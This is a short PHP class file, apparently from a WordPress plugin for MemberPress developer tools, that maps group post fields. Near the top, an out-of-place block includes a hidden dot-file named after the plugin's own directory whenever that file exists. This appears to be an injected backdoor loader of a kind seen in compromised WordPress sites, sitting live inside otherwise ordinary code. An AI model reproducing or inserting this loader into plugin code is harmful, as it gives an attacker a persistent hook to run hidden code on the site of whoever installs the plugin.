<?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpdtGroupUtils extends MpdtBaseCptUtils {
  public $model_class = 'MeprGroup';

  public function __construct() {
    $this->map = array(
      'post_name'                => false,
      'post_parent'              => false,
      'post_type'                => false,
      'post_password'            => false,
      'post_content_filtered'    => false,
      'post_mime_type'           => false,
      'guid'                     => false,
      'group_page_style_options' => false
    );

    parent::__construct();
  }

}

